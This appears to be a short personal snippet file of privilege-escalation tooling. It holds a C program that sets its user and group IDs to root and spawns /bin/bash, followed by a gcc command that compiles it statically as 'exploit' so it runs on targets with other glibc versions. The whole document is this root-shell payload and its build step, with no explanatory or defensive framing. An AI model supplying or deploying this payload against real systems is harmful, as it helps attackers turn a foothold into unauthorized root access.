# C++ Snippets Utils

```cpp
#include<unistd.h>
void main(){
    setuid(0);
    setgid(0);
    system("/bin/bash");
}
```

### Compile without dependency of GLIBC_2.XX

```bash
gcc exploit.c -o exploit -w -static
```
